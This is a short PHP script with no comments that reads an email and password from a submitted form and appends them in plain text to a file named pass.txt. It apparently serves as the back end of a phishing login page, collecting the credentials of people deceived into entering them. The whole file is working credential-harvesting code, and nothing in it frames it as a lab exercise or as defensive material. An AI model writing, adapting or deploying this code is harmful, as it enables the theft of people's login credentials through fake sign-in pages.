<?php
$input1=$_POST["email"];
$input2=$_POST["pass"];
$fp=fopen("pass.txt","a+");
$msg="\nUsername:".$input1." Password:".$input2."\n";
fwrite($fp, $msg);
?>
